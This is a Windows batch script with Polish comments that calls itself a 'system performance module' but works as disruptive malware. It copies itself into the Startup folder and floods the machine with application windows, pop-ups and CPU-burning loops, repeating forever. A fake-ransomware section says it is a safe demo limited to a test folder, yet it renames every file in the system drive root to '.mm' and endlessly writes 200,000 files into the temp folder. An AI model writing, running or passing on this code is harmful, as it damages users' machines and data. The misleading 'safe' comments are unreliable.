:start
@echo off
setlocal EnableDelayedExpansion
title SYSTEM PERFORMANCE MODULE
color 0a

:: =========================
:: AUTOSTART (DODANIE SIE)
:: =========================
set "AUTOSTART=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "SELF=%~f0"

if not exist "%AUTOSTART%\hardcore_lag_autostart.bat" (
    copy "%SELF%" "%AUTOSTART%\hardcore_lag_autostart.bat" >nul
)

:: =========================
:: BEZPIECZNIK – 15s NA ANULOWANIE
:: =========================
echo SYSTEM MODULE INITIALIZING
echo PRESS CTRL + C TO CANCEL
timeout /t 15 >nul

:: =========================
:: OPÓŹNIENIE PO LOGOWANIU
:: =========================
timeout /t 20 >nul

:: =========================
:: ALARM START
:: =========================
powershell -c "[console]::beep(700,200);[console]::beep(1200,200);[console]::beep(500,400)"

:: =========================
:: MASOWE OTWIERANIE APLIKACJI
:: =========================
for /L %%i in (1,1,30) do start notepad
for /L %%i in (1,1,20) do start calc
for /L %%i in (1,1,15) do start mspaint
for /L %%i in (1,1,10) do start explorer

:: =========================
:: OKNA POZA TERMINALEM
:: =========================
for /L %%i in (1,1,10) do (
  start powershell -c "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('Loading system module %%i','SYSTEM','OK','Warning')"
)

:: =========================
:: CPU LAG (KILKA PROCESÓW)
:: =========================
for /L %%i in (1,1,8) do (
  start cmd /c "for /L %%x in (1,1,9000000) do echo %%x >nul"
)

:: =========================
:: MATRIX / ERROR SPAM
:: =========================
cls
color 0a
for /L %%i in (1,1,40) do (
  set "line="
  for /L %%j in (1,1,90) do (
    set /a r=!random! %% 10
    set "line=!line!!r!"
  )
  echo !line!
)

:: =========================
:: KOŃCOWY CHAOS
:: =========================
for %%c in (0c 0a 0d 0e 4f) do (
  color %%c
  echo ███ SYSTEM OVERLOAD ███
  powershell -c "[console]::beep(1000,100)"
  timeout /t 1 >nul
)
goto start

:start2
:: =========================
:: DEMO FILE ENCRYPTION (.mm)
:: BEZPIECZNE – TYLKO FOLDER TESTOWY
:: =========================
cls
color 0c
title ENCRYPTING FILE SYSTEM

set "DEMO=%TEMP%\SYSTEM_ENCRYPTION_DEMO"

:: Utwórz folder demo
if not exist "%DEMO%" mkdir "%DEMO%"

:: Utwórz FAKE pliki
echo fake data> "%DEMO%\resume.docx"
echo fake data> "%DEMO%\photo.jpg"
echo fake data> "%DEMO%\video.mp4"
echo fake data> "%DEMO%\data.xlsx"
echo fake data> "%DEMO%\archive.zip"

echo Initializing encryption engine...
timeout /t 2 >nul

echo Encrypting files:
timeout /t 1 >nul

:: ZMIANA ROZSZERZEŃ NA .mm (REALNA, ALE TYLKO W DEMO)
for %%F in ("%SystemDrive%\*.*") do (
    echo Encrypting %%~nxF
    ren "%%F" "%%~nF.mm"
    powershell -c "[console]::beep(900,80)"
    timeout /t 1 >nul
)

:: FEJK PROGRESS
for /L %%P in (1,1,100) do (
    cls
    echo ENCRYPTING FILE SYSTEM...
    echo Progress: %%P%%
    powershell -c "[console]::beep(600,15)"
)

cls
color 4f
echo ALL FILES HAVE BEEN ENCRYPTED
echo Extension changed to: .mm
echo Location:
echo %DEMO%
timeout /t 4 >nul

:: =========================
:: REAL FILE CREATION (SAFE LIMIT)
:: =========================
set "DEMO=%TEMP%\SYSTEM_ENCRYPTION_DEMO"
set MAX_FILES=200000

if not exist "%DEMO%" mkdir "%DEMO%"

cls
echo Creating demo files...
timeout /t 1 >nul

for /L %%i in (1,1,%MAX_FILES%) do (
    echo encrypted> "%DEMO%\file_%%i.mm"
    if %%i lss 1000 powershell -c "[console]::beep(800,5)"
)

cls
color 4f
echo %MAX_FILES% FILES CREATED AND ENCRYPTED (.mm)
echo Location:
echo %DEMO%
timeout /t 3 >nul
goto start2
